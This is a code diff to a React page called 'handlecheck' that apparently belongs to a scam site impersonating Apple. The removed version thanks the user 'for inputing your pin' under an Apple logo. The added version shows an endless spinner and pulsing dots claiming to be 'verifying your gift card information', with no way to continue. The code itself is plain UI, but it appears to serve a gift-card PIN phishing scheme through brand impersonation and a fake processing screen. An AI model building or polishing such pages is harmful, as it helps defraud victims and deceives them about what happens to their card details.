@@ -111,28 +111,66 @@ export default function handlecheck() {
           maxWidth: '600px',
           padding: '2.5rem 2rem'
         }}>
-          <img src="/appleLogo.png" alt="Apple Logo" style={{ width: 60, height: 60, marginBottom: 24, borderRadius: '50%', background: '#fff', boxShadow: '0 2px 8px rgba(0,0,0,0.06)' }} />
+          {/* Loading Spinner */}
+          <div style={{
+            width: '60px',
+            height: '60px',
+            border: '4px solid #f3f3f3',
+            borderTop: '4px solid #0071e3',
+            borderRadius: '50%',
+            animation: 'spin 1s linear infinite',
+            marginBottom: '24px'
+          }}></div>
           <h2 style={{ fontWeight: 'bold', fontSize: '2rem', margin: '0 0 1.2rem 0', textAlign: 'center', color: '#222' }}>
-            We will get back to you shortly
+            Processing Your Request
           </h2>
           <p style={{ fontSize: '1.15rem', color: '#444', textAlign: 'center', maxWidth: '500px', marginBottom: 24 }}>
-            Thank you for inputing your pin. Our support team will review your request and contact you at your registered email address soon.<br /><br />
-            <span style={{ color: '#0071e3', fontWeight: 500 }}>You can close this page or return to the home page.</span>
+            We're verifying your gift card information. we will get back to you shortly...
           </p>
-          <Link href="/" passHref legacyBehavior>
-            <button style={{
-              background: '#0071e3',
-              color: '#fff',
-              border: 'none',
-              borderRadius: 26,
-              fontWeight: 'bold',
-              fontSize: '1.1rem',
-              padding: '0.9rem 2.5rem',
-              cursor: 'pointer',
-              marginTop: 8
-            }}>Go to Home</button>
-          </Link>
+          {/* Progress dots */}
+          <div style={{ display: 'flex', gap: '8px', marginTop: '16px' }}>
+            <div style={{
+              width: '8px',
+              height: '8px',
+              borderRadius: '50%',
+              backgroundColor: '#0071e3',
+              animation: 'pulse 1.5s ease-in-out infinite'
+            }}></div>
+            <div style={{
+              width: '8px',
+              height: '8px',
+              borderRadius: '50%',
+              backgroundColor: '#0071e3',
+              animation: 'pulse 1.5s ease-in-out 0.3s infinite'
+            }}></div>
+            <div style={{
+              width: '8px',
+              height: '8px',
+              borderRadius: '50%',
+              backgroundColor: '#0071e3',
+              animation: 'pulse 1.5s ease-in-out 0.6s infinite'
+            }}></div>
+          </div>
         </div>
+
+        {/* CSS Animations */}
+        <style jsx>{`
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+          
+          @keyframes pulse {
+            0%, 80%, 100% {
+              opacity: 0.3;
+              transform: scale(0.8);
+            }
+            40% {
+              opacity: 1;
+              transform: scale(1);
+            }
+          }
+        `}</style>
       </main>
 
       {/* Footer */}
